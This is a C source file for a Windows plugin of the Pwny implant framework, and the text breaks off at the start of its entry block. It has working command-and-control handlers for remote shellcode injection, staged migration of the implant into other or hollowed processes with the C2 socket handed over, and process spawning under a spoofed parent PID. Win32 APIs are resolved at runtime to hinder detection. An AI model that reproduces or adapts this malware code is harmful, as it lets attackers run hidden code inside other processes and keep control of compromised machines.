/*
 * MIT License
 *
 * Copyright (c) 2020-2026 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

/*
 * Inject tab plugin — merged: inject + migrate + ppid_spoof.
 *
 * Handlers:
 *   inject_shellcode  (API_CALL)     — remote shellcode injection
 *   migrate_load      (API_CALL + 1) — staged process migration
 *   ppid_spawn        (API_CALL + 2) — PPID-spoofed process spawn
 *
 * COT (Code-Only Tab) build: all Pwny API calls go through the
 * vtable; all Win32 APIs are resolved at runtime via cot_resolve().
 *
 * This plugin includes stager_x64.S which provides the embedded stager
 * shellcode (stager_x64_start / stager_x64_end symbols).
 */

#ifdef __windows__

#include <pwny/api.h>
#include <pwny/tlv_types.h>
#include <pwny/c2.h>

#include <winsock2.h>
#include <windows.h>
#include <tlhelp32.h>
#include <stdarg.h>
#include <string.h>
#include <pwny/tunnel.h>
#include <pwny/net_client.h>

/* ================================================================== */
/* Win32 function pointer types — resolved at init via cot_resolve()   */
/* ================================================================== */

/* kernel32.dll — shared across inject / migrate / ppid_spoof */
typedef HANDLE  (WINAPI *fn_OpenProcess)(DWORD, BOOL, DWORD);
typedef LPVOID  (WINAPI *fn_VirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL    (WINAPI *fn_WriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *);
typedef BOOL    (WINAPI *fn_VirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL    (WINAPI *fn_VirtualFreeEx)(HANDLE, LPVOID, SIZE_T, DWORD);
typedef BOOL    (WINAPI *fn_CloseHandle)(HANDLE);
typedef DWORD   (WINAPI *fn_GetLastError)(void);
typedef HMODULE (WINAPI *fn_GetModuleHandleA)(LPCSTR);
typedef FARPROC (WINAPI *fn_GetProcAddress)(HMODULE, LPCSTR);
typedef BOOL    (WINAPI *fn_CreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);

/* kernel32.dll — inject_tech.h thread enumeration */
typedef HANDLE  (WINAPI *fn_CreateToolhelp32Snapshot)(DWORD, DWORD);
typedef BOOL    (WINAPI *fn_Thread32First)(HANDLE, LPTHREADENTRY32);
typedef BOOL    (WINAPI *fn_Thread32Next)(HANDLE, LPTHREADENTRY32);
typedef HANDLE  (WINAPI *fn_OpenThread)(DWORD, BOOL, DWORD);
typedef DWORD   (WINAPI *fn_GetCurrentProcessId)(void);
typedef HANDLE  (WINAPI *fn_CreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD   (WINAPI *fn_SuspendThread)(HANDLE);
typedef DWORD   (WINAPI *fn_ResumeThread)(HANDLE);
typedef DWORD   (WINAPI *fn_QueueUserAPC)(PAPCFUNC, HANDLE, ULONG_PTR);
typedef BOOL    (WINAPI *fn_GetThreadContext)(HANDLE, LPCONTEXT);
typedef BOOL    (WINAPI *fn_SetThreadContext)(HANDLE, const CONTEXT *);

/* kernel32.dll — migrate-specific */
typedef HANDLE  (WINAPI *fn_GetCurrentProcess)(void);
typedef BOOL    (WINAPI *fn_DuplicateHandle)(HANDLE, HANDLE, HANDLE, LPHANDLE, DWORD, BOOL, DWORD);
typedef HANDLE  (WINAPI *fn_CreateFileMappingA)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
typedef LPVOID  (WINAPI *fn_MapViewOfFile)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
typedef BOOL    (WINAPI *fn_UnmapViewOfFile)(LPCVOID);
typedef BOOL    (WINAPI *fn_TerminateProcess)(HANDLE, UINT);

/* kernel32.dll — ppid_spoof-specific */
typedef BOOL    (WINAPI *fn_InitializeProcThreadAttributeList)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD, PSIZE_T);
typedef BOOL    (WINAPI *fn_UpdateProcThreadAttribute)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD_PTR, PVOID, SIZE_T, PVOID, PSIZE_T);
typedef void    (WINAPI *fn_DeleteProcThreadAttributeList)(LPPROC_THREAD_ATTRIBUTE_LIST);

/* ws2_32.dll — migrate socket passing */
typedef int     (WSAAPI *fn_WSADuplicateSocketW)(SOCKET, DWORD, LPWSAPROTOCOL_INFOW);
typedef int     (WSAAPI *fn_WSAGetLastError)(void);

/* msvcrt.dll — migrate error formatting */
typedef int     (__cdecl *fn_vsnprintf)(char *, size_t, const char *, va_list);

/* ================================================================== */
/* Unified resolved-pointer struct                                     */
/* ================================================================== */

static struct
{
    /* kernel32 — shared */
    fn_OpenProcess              pOpenProcess;
    fn_VirtualAllocEx           pVirtualAllocEx;
    fn_WriteProcessMemory       pWriteProcessMemory;
    fn_VirtualProtectEx         pVirtualProtectEx;
    fn_VirtualFreeEx            pVirtualFreeEx;
    fn_CloseHandle              pCloseHandle;
    fn_GetLastError             pGetLastError;
    fn_GetModuleHandleA         pGetModuleHandleA;
    fn_GetProcAddress           pGetProcAddress;
    fn_CreateProcessA           pCreateProcessA;

    /* kernel32 — inject_tech.h */
    fn_CreateToolhelp32Snapshot pCreateToolhelp32Snapshot;
    fn_Thread32First            pThread32First;
    fn_Thread32Next             pThread32Next;
    fn_OpenThread               pOpenThread;
    fn_GetCurrentProcessId      pGetCurrentProcessId;
    fn_CreateRemoteThread       pCreateRemoteThread;
    fn_SuspendThread            pSuspendThread;
    fn_ResumeThread             pResumeThread;
    fn_QueueUserAPC             pQueueUserAPC;
    fn_GetThreadContext         pGetThreadContext;
    fn_SetThreadContext         pSetThreadContext;

    /* kernel32 — migrate */
    fn_GetCurrentProcess        pGetCurrentProcess;
    fn_DuplicateHandle          pDuplicateHandle;
    fn_CreateFileMappingA       pCreateFileMappingA;
    fn_MapViewOfFile            pMapViewOfFile;
    fn_UnmapViewOfFile          pUnmapViewOfFile;
    fn_TerminateProcess         pTerminateProcess;

    /* kernel32 — ppid_spoof */
    fn_InitializeProcThreadAttributeList pInitializeProcThreadAttributeList;
    fn_UpdateProcThreadAttribute         pUpdateProcThreadAttribute;
    fn_DeleteProcThreadAttributeList     pDeleteProcThreadAttributeList;

    /* ws2_32 — migrate */
    fn_WSADuplicateSocketW      pWSADuplicateSocketW;
    fn_WSAGetLastError          pWSAGetLastError;

    /* msvcrt — migrate */
    fn_vsnprintf                pvsnprintf;
} w;

/* ================================================================== */
/* Redirect Win32 names through the resolved pointers.                 */
/* These macros are active for inject_tech.h AND all handler code.     */
/* ================================================================== */

/* Shared */
#define OpenProcess              w.pOpenProcess
#define VirtualAllocEx           w.pVirtualAllocEx
#define WriteProcessMemory       w.pWriteProcessMemory
#define VirtualProtectEx         w.pVirtualProtectEx
#define VirtualFreeEx            w.pVirtualFreeEx
#define CloseHandle              w.pCloseHandle
#define GetLastError             w.pGetLastError
#define GetModuleHandleA         w.pGetModuleHandleA
#define GetProcAddress           w.pGetProcAddress
#define CreateProcessA           w.pCreateProcessA

/* inject_tech.h */
#define CreateToolhelp32Snapshot w.pCreateToolhelp32Snapshot
#define Thread32First            w.pThread32First
#define Thread32Next             w.pThread32Next
#define OpenThread               w.pOpenThread
#define GetCurrentProcessId      w.pGetCurrentProcessId
#define CreateRemoteThread       w.pCreateRemoteThread
#define SuspendThread            w.pSuspendThread
#define ResumeThread             w.pResumeThread
#define QueueUserAPC             w.pQueueUserAPC
#define GetThreadContext         w.pGetThreadContext
#define SetThreadContext         w.pSetThreadContext

/* migrate */
#define GetCurrentProcess        w.pGetCurrentProcess
#define DuplicateHandle          w.pDuplicateHandle
#define CreateFileMappingA       w.pCreateFileMappingA
#define MapViewOfFile            w.pMapViewOfFile
#define UnmapViewOfFile          w.pUnmapViewOfFile
#define TerminateProcess         w.pTerminateProcess
#define WSADuplicateSocketW      w.pWSADuplicateSocketW
#define WSAGetLastError          w.pWSAGetLastError
#define vsnprintf                w.pvsnprintf

#include <pwny/windows/inject_tech.h>

/* tab_cot.h MUST come after the real Pwny headers and after
 * inject_tech.h: its macros redefine api_call_register,
 * tlv_pkt_get_*, log_debug, memcpy, memset, free, etc. */
#define COT_PLUGIN
#include <pwny/tab_cot.h>

/* ================================================================== */
/* Tag / type definitions                                              */
/* ================================================================== */

/* --- inject_shellcode --- */
#define INJECT_SHELLCODE \
        TLV_TAG_CUSTOM(API_CALL_STATIC, TAB_BASE, API_CALL)

#define TLV_TYPE_INJECT_SC_TECHNIQUE \
        TLV_TYPE_CUSTOM(TLV_TYPE_INT, TAB_BASE, API_TYPE)

/* --- migrate_load --- */
#define MIGRATE_LOAD \
        TLV_TAG_CUSTOM(API_CALL_STATIC, TAB_BASE, API_CALL + 1)

#define TLV_TYPE_INJECT_TECHNIQUE \
        TLV_TYPE_CUSTOM(TLV_TYPE_INT, TAB_BASE, API_TYPE + 1)

#define TLV_TYPE_MIGRATE_ERROR \
        TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 2)

/* --- ppid_spawn --- */
#define PPID_SPAWN \
        TLV_TAG_CUSTOM(API_CALL_STATIC, TAB_BASE, API_CALL + 2)

#define TLV_TYPE_PPID_PARENT \
        TLV_TYPE_CUSTOM(TLV_TYPE_INT, TAB_BASE, API_TYPE + 3)

#define TLV_TYPE_PPID_CMD \
        TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 4)

#define TLV_TYPE_PPID_CHILD \
        TLV_TYPE_CUSTOM(TLV_TYPE_INT, TAB_BASE, API_TYPE + 5)

/* ================================================================== */
/* Handler 1: inject_shellcode (from inject.c)                         */
/* ================================================================== */

static tlv_pkt_t *inject_shellcode(c2_t *c2)
{
    int pid;
    int size;
    int technique;
    unsigned char *shellcode;
    HANDLE hProcess;
    LPVOID pRemote;
    DWORD dwOldProt;

    if (tlv_pkt_get_u32(c2->request, TLV_TYPE_PID, &pid) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (tlv_pkt_get_u32(c2->request, TLV_TYPE_INJECT_SC_TECHNIQUE,
                         &technique) < 0)
    {
        technique = INJECT_TECH_DEFAULT;
    }

    size = tlv_pkt_get_bytes(c2->request, TLV_TYPE_BYTES, &shellcode);
    if (size <= 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE, (DWORD)pid
    );

    if (hProcess == NULL)
    {
        log_debug("* inject: OpenProcess(%d) failed (%lu)\n",
                  pid, GetLastError());
        free(shellcode);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    pRemote = VirtualAllocEx(hProcess, NULL, (SIZE_T)size,
                             MEM_COMMIT | MEM_RESERVE,
                             PAGE_READWRITE);
    if (pRemote == NULL)
    {
        log_debug("* inject: VirtualAllocEx failed (%lu)\n", GetLastError());
        CloseHandle(hProcess);
        free(shellcode);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (!WriteProcessMemory(hProcess, pRemote, shellcode, (SIZE_T)size, NULL))
    {
        log_debug("* inject: WriteProcessMemory failed (%lu)\n", GetLastError());
        VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        free(shellcode);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    free(shellcode);

    if (!VirtualProtectEx(hProcess, pRemote, (SIZE_T)size,
                          PAGE_EXECUTE_READ, &dwOldProt))
    {
        log_debug("* inject: VirtualProtectEx failed (%lu)\n", GetLastError());
        VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (!inject_execute_code(technique, hProcess, (DWORD)pid, pRemote, NULL))
    {
        log_debug("* inject: code execution failed (technique %d)\n",
                  technique);
        VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    CloseHandle(hProcess);

    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
}

/* ================================================================== */
/* Handler 2: migrate_load (from migrate.c)                            */
/* ================================================================== */

/*
 * Helper: build a FAIL response with an embedded error string.
 */

static tlv_pkt_t *migrate_fail(c2_t *c2, const char *fmt, ...)
{
    tlv_pkt_t *pkt;
    char buf[256];
    va_list ap;

    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);

    log_debug("* migrate FAIL: %s\n", buf);

    pkt = api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    tlv_pkt_add_string(pkt, TLV_TYPE_MIGRATE_ERROR, buf);
    return pkt;
}

/*
 * Convert an RVA to a raw file offset using the PE section headers.
 */

static DWORD migrate_rva_to_offset(DWORD rva, PIMAGE_SECTION_HEADER sections,
                                   WORD num_sections)
{
    WORD i;

    for (i = 0; i < num_sections; i++)
    {
        if (rva >= sections[i].VirtualAddress &&
            rva < sections[i].VirtualAddress + sections[i].SizeOfRawData)
        {
            return rva - sections[i].VirtualAddress +
                   sections[i].PointerToRawData;
        }
    }

    return rva;
}

/*
 * Find the file offset of a named export in a PE image buffer.
 * Returns 0 on failure.
 */

static DWORD migrate_find_loader_offset(LPVOID lpBuffer, DWORD dwLength,
                                        LPCSTR funcName)
{
    UINT_PTR base;
    PIMAGE_DOS_HEADER dos;
    PIMAGE_NT_HEADERS nt;
    PIMAGE_SECTION_HEADER sections;
    PIMAGE_EXPORT_DIRECTORY exports;
    WORD num_sections;
    DWORD export_rva;
    DWORD *names;
    DWORD *functions;
    WORD *ordinals;
    DWORD i;

    base = (UINT_PTR)lpBuffer;
    dos = (PIMAGE_DOS_HEADER)base;

    if (dwLength < sizeof(IMAGE_DOS_HEADER) ||
        dos->e_magic != IMAGE_DOS_SIGNATURE)
    {
        return 0;
    }

    nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);

    if (nt->Signature != IMAGE_NT_SIGNATURE)
    {
        return 0;
    }

    if (nt->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC)
    {
        PIMAGE_NT_HEADERS64 nt64 = (PIMAGE_NT_HEADERS64)nt;
        export_rva = nt64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        num_sections = nt64->FileHeader.NumberOfSections;
        sections = (PIMAGE_SECTION_HEADER)((UINT_PTR)&nt64->OptionalHeader +
                                           nt64->FileHeader.SizeOfOptionalHeader);
    }
    else if (nt->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC)
    {
        PIMAGE_NT_HEADERS32 nt32 = (PIMAGE_NT_HEADERS32)nt;
        export_rva = nt32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        num_sections = nt32->FileHeader.NumberOfSections;
        sections = (PIMAGE_SECTION_HEADER)((UINT_PTR)&nt32->OptionalHeader +
                                           nt32->FileHeader.SizeOfOptionalHeader);
    }
    else
    {
        return 0;
    }

    if (export_rva == 0)
    {
        return 0;
    }

    exports = (PIMAGE_EXPORT_DIRECTORY)(base +
                  migrate_rva_to_offset(export_rva, sections, num_sections));

    names = (DWORD *)(base +
                migrate_rva_to_offset(exports->AddressOfNames, sections, num_sections));
    ordinals = (WORD *)(base +
                   migrate_rva_to_offset(exports->AddressOfNameOrdinals, sections, num_sections));
    functions = (DWORD *)(base +
                    migrate_rva_to_offset(exports->AddressOfFunctions, sections, num_sections));

    for (i = 0; i < exports->NumberOfNames; i++)
    {
        char *name = (char *)(base +
                        migrate_rva_to_offset(names[i], sections, num_sections));

        if (strstr(name, funcName) != NULL)
        {
            return migrate_rva_to_offset(functions[ordinals[i]],
                                         sections, num_sections);
        }
    }

    return 0;
}

static tlv_pkt_t *migrate_load(c2_t *c2)
{
    int pid;
    int size;
    int technique;
    unsigned char *image;

    HANDLE hProcess;
    HANDLE hDllSection;
    HANDLE hDupDllSection;

    LPVOID lpDllView;
    LPVOID lpRemote;
    LPVOID lpRemoteProtoInfo;

    DWORD dwLoaderOffset;
    DWORD dwOldProt;

    SOCKET c2_sock;
    WSAPROTOCOL_INFOW protocolInfo;
    net_t *net;
    PROCESS_INFORMATION hollow_pi;
    BOOL is_hollow;

    /* Stager context — patched and written to remote process. */
    typedef struct __attribute__((packed))
    {
        UINT_PTR pfnMapViewOfFile;      /* +0x00 */
        UINT_PTR pfnVirtualAlloc;       /* +0x08 */
        UINT_PTR pfnVirtualProtect;     /* +0x10 */
        UINT_PTR pfnUnmapViewOfFile;    /* +0x18 */
        UINT_PTR pfnCloseHandle;        /* +0x20 */
        DWORD    dwDllSize;             /* +0x28 */
        DWORD    dwLoaderOffset;        /* +0x2C */
        UINT_PTR hDllSection;           /* +0x30 */
        UINT_PTR hDupSocket;            /* +0x38 */
    } stager_context_t;

    /* Stager shellcode — assembled from stager_x64.S in this plugin */
    extern unsigned char stager_x64_start[];
    extern unsigned char stager_x64_end[];

    SIZE_T stager_code_size;
    SIZE_T stager_total_size;
    HMODULE hKernel32;
    stager_context_t ctx;

    if (tlv_pkt_get_u32(c2->request, TLV_TYPE_PID, &pid) < 0)
    {
        pid = 0;
    }

    if (tlv_pkt_get_u32(c2->request, TLV_TYPE_INJECT_TECHNIQUE,
                         &technique) < 0)
    {
        technique = INJECT_TECH_DEFAULT;
    }

    is_hollow = (technique == INJECT_TECH_HOLLOW);
    memset(&hollow_pi, 0, sizeof(hollow_pi));

    log_debug("* migrate: staged injection, technique %d%s\n",
              technique, is_hollow ? " (hollow)" : "");

    size = tlv_pkt_get_bytes(c2->request, TLV_TYPE_BYTES, &image);
    if (size <= 0)
    {
        return migrate_fail(c2, "no DLL image in request");
    }

    /* Find the self-loader export in the DLL image */

    dwLoaderOffset = migrate_find_loader_offset(image, (DWORD)size,
                                                "_DllInit");
    if (dwLoaderOffset == 0)
    {
        free(image);
        return migrate_fail(c2, "_DllInit not found in PE exports");
    }

    log_debug("* migrate: _DllInit at offset 0x%lx\n",
              (unsigned long)dwLoaderOffset);

    /* ---- Acquire target process ---- */

    if (is_hollow)
    {
        if (!inject_hollow_spawn(&hollow_pi))
        {
            free(image);
            return migrate_fail(c2, "hollow spawn failed (%lu)", GetLastError());
        }

        hProcess = hollow_pi.hProcess;
        pid = (int)hollow_pi.dwProcessId;
        log_debug("* migrate: hollow child PID %d\n", pid);
    }
    else
    {
        if (pid == 0)
        {
            free(image);
            return migrate_fail(c2, "no PID specified for non-hollow technique");
        }

        hProcess = OpenProcess(
            PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
            PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ |
            PROCESS_DUP_HANDLE,
            FALSE, (DWORD)pid
        );

        if (hProcess == NULL)
        {
            free(image);
            return migrate_fail(c2, "OpenProcess(%d) failed (%lu)", pid, GetLastError());
        }
    }

    /* Get the C2 socket from the active tunnel */

    net = (net_t *)c2->tunnel->data;
    c2_sock = (SOCKET)net->io->pipe[0];

    /* Export the C2 socket for the target process using WSADuplicateSocketW.
     * DuplicateHandle does NOT work reliably for Winsock sockets on modern
     * Windows because the Winsock layer maintains per-process state that
     * the kernel handle duplication doesn't transfer. */

    if (WSADuplicateSocketW(c2_sock, (DWORD)pid, &protocolInfo) != 0)
    {
        CloseHandle(hProcess);
        free(image);
        return migrate_fail(c2, "WSADuplicateSocket failed (%d)", WSAGetLastError());
    }

    /* Allocate memory in the target process for the WSAPROTOCOL_INFOW
     * struct so the new Pwny instance can recreate the socket. */

    lpRemoteProtoInfo = VirtualAllocEx(
        hProcess, NULL, sizeof(WSAPROTOCOL_INFOW),
        MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE
    );

    if (lpRemoteProtoInfo == NULL)
    {
        CloseHandle(hProcess);
        free(image);
        return migrate_fail(c2, "VirtualAllocEx (proto info) failed (%lu)", GetLastError());
    }

    if (!WriteProcessMemory(hProcess, lpRemoteProtoInfo,
                            &protocolInfo, sizeof(protocolInfo), NULL))
    {
        VirtualFreeEx(hProcess, lpRemoteProtoInfo, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        free(image);
        return migrate_fail(c2, "WriteProcessMemory (proto info) failed (%lu)", GetLastError());
    }

    log_debug("* migrate: exported socket via WSADuplicateSocket, "
              "proto info at %p in PID %d\n",
              lpRemoteProtoInfo, pid);

    /* ---- Anonymous DLL section ---- */

    hDllSection = CreateFileMappingA(
        INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE,
        0, (DWORD)size, NULL
    );

    if (hDllSection == NULL)
    {
        CloseHandle(hProcess);
        free(image);
        return migrate_fail(c2, "CreateFileMapping (DLL) failed (%lu)", GetLastError());
    }

    lpDllView = MapViewOfFile(hDllSection, FILE_MAP_WRITE, 0, 0, (SIZE_T)size);
    if (lpDllView == NULL)
    {
        CloseHandle(hDllSection);
        CloseHandle(hProcess);
        free(image);
        return migrate_fail(c2, "MapViewOfFile (DLL) failed (%lu)", GetLastError());
    }

    memcpy(lpDllView, image, (SIZE_T)size);
    UnmapViewOfFile(lpDllView);
    free(image);

    /* Duplicate the anonymous section handle into the target process */

    if (!DuplicateHandle(
            GetCurrentProcess(), hDllSection,
            hProcess, &hDupDllSection,
            0, FALSE, DUPLICATE_SAME_ACCESS))
    {
        CloseHandle(hDllSection);
        CloseHandle(hProcess);
        return migrate_fail(c2, "DuplicateHandle (dll section) failed (%lu)", GetLastError());
    }

    log_debug("* migrate: DLL (%d bytes) in anonymous section, dup handle %llu\n",
              size, (unsigned long long)(ULONG_PTR)hDupDllSection);

    /* ---- Build stager context ---- */

    hKernel32 = GetModuleHandleA("kernel32.dll");

    memset(&ctx, 0, sizeof(ctx));
    ctx.pfnMapViewOfFile    = (UINT_PTR)GetProcAddress(hKernel32, "MapViewOfFile");
    ctx.pfnVirtualAlloc     = (UINT_PTR)GetProcAddress(hKernel32, "VirtualAlloc");
    ctx.pfnVirtualProtect   = (UINT_PTR)GetProcAddress(hKernel32, "VirtualProtect");
    ctx.pfnUnmapViewOfFile  = (UINT_PTR)GetProcAddress(hKernel32, "UnmapViewOfFile");
    ctx.pfnCloseHandle      = (UINT_PTR)GetProcAddress(hKernel32, "CloseHandle");
    ctx.dwDllSize           = (DWORD)size;
    ctx.dwLoaderOffset      = dwLoaderOffset;
    ctx.hDllSection         = (UINT_PTR)hDupDllSection;
    /* Pass the address of the WSAPROTOCOL_INFOW in the target process.
     * The stager forwards this value through _DllInit -> DllMain lpReserved.
     * The new Pwny instance calls WSASocketW() with it to recreate the
     * C2 socket. */
    ctx.hDupSocket          = (UINT_PTR)lpRemoteProtoInfo;

    /* ---- Inject stager cross-process ---- */

    stager_code_size  = (SIZE_T)(stager_x64_end - stager_x64_start);
    stager_total_size = stager_code_size + sizeof(stager_context_t);

    log_debug("* migrate: stager code=%llu ctx=%llu total=%llu bytes\n",
              (unsigned long long)stager_code_size,
              (unsigned long long)sizeof(stager_context_t),
              (unsigned long long)stager_total_size);

    lpRemote = VirtualAllocEx(
        hProcess, NULL, stager_total_size,
        MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE
    );

    if (lpRemote == NULL)
    {
        CloseHandle(hDllSection);
        CloseHandle(hProcess);
        return migrate_fail(c2, "VirtualAllocEx (stager) failed (%lu)", GetLastError());
    }

    /* Write stager code */
    if (!WriteProcessMemory(hProcess, lpRemote,
                            stager_x64_start, stager_code_size, NULL))
    {
        VirtualFreeEx(hProcess, lpRemote, 0, MEM_RELEASE);
        CloseHandle(hDllSection);
        CloseHandle(hProcess);
        return migrate_fail(c2, "WriteProcessMemory (stager) failed (%lu)", GetLastError());
    }

    /* Write context immediately after stager code */
    if (!WriteProcessMemory(hProcess,
                            (BYTE *)lpRemote + stager_code_size,
                            &ctx, sizeof(ctx), NULL))
    {
        VirtualFreeEx(hProcess, lpRemote, 0, MEM_RELEASE);
        CloseHandle(hDllSection);
        CloseHandle(hProcess);
        return migrate_fail(c2, "WriteProcessMemory (ctx) failed (%lu)", GetLastError());
    }

    /* Flip to RX */
    if (!VirtualProtectEx(hProcess, lpRemote, stager_total_size,
                          PAGE_EXECUTE_READ, &dwOldProt))
    {
        VirtualFreeEx(hProcess, lpRemote, 0, MEM_RELEASE);
        CloseHandle(hDllSection);
        CloseHandle(hProcess);
        return migrate_fail(c2, "VirtualProtectEx (stager) failed (%lu)", GetLastError());
    }

    /* Execute stager via chosen technique */

    if (is_hollow)
    {
        if (!inject_hollow_redirect(hProcess, hollow_pi.hThread, lpRemote))
        {
            TerminateProcess(hProcess, 1);
            VirtualFreeEx(hProcess, lpRemote, 0, MEM_RELEASE);
            CloseHandle(hollow_pi.hThread);
            CloseHandle(hDllSection);
            CloseHandle(hProcess);
            return migrate_fail(c2, "hollow redirect failed (%lu)", GetLastError());
        }

        CloseHandle(hollow_pi.hThread);
    }
    else
    {
        if (!inject_execute_code(technique, hProcess, (DWORD)pid,
                                 lpRemote, NULL))
        {
            VirtualFreeEx(hProcess, lpRemote, 0, MEM_RELEASE);
            CloseHandle(hDllSection);
            CloseHandle(hProcess);
            return migrate_fail(c2, "code execution failed (technique %d, err %lu)", technique, GetLastError());
        }
    }

    log_debug("* migrate: staged injection succeeded (technique %d, PID %d)\n",
              technique, pid);
    log_debug("* migrate: cross-process write: %llu bytes (vs %d DLL)\n",
              (unsigned long long)stager_total_size, size);

    CloseHandle(hProcess);

    return api_craft_tlv_pkt(API_CALL_QUIT, c2->request);
}

/* ================================================================== */
/* Handler 3: ppid_spawn (from ppid_spoof.c)                           */
/* ================================================================== */

static tlv_pkt_t *ppid_spawn(c2_t *c2)
{
    int parent_pid;
    char cmd[1024];
    HANDLE hParent;

    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    SIZE_T attrSize;

    if (tlv_pkt_get_u32(c2->request, TLV_TYPE_PPID_PARENT, &parent_pid) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (tlv_pkt_get_string(c2->request, TLV_TYPE_PPID_CMD, cmd) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    hParent = w.pOpenProcess(PROCESS_CREATE_PROCESS, FALSE, (DWORD)parent_pid);
    if (hParent == NULL)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    memset(&si, 0, sizeof(si));
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    memset(&pi, 0, sizeof(pi));

    /* Determine attribute list size */
    w.pInitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);

    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(attrSize);
    if (si.lpAttributeList == NULL)
    {
        w.pCloseHandle(hParent);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (!w.pInitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize))
    {
        free(si.lpAttributeList);
        w.pCloseHandle(hParent);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (!w.pUpdateProcThreadAttribute(si.lpAttributeList, 0,
                                      PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                                      &hParent, sizeof(HANDLE), NULL, NULL))
    {
        w.pDeleteProcThreadAttributeList(si.lpAttributeList);
        free(si.lpAttributeList);
        w.pCloseHandle(hParent);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (!w.pCreateProcessA(NULL, cmd, NULL, NULL, FALSE,
                           EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
                           NULL, NULL,
                           (LPSTARTUPINFOA)&si, &pi))
    {
        w.pDeleteProcThreadAttributeList(si.lpAttributeList);
        free(si.lpAttributeList);
        w.pCloseHandle(hParent);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    w.pDeleteProcThreadAttributeList(si.lpAttributeList);
    free(si.lpAttributeList);
    w.pCloseHandle(hParent);

    w.pCloseHandle(pi.hThread);

    {
        tlv_pkt_t *result;
        result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
        tlv_pkt_add_u32(result, TLV_TYPE_PPID_CHILD, (int32_t)pi.dwProcessId);
        w.pCloseHandle(pi.hProcess);
        return result;
    }
}

/* ================================================================== */
/* COT entry                                                           */
/* ================================================================== */

COT_ENTRY
{
    /* ---- kernel32.dll — shared ---- */
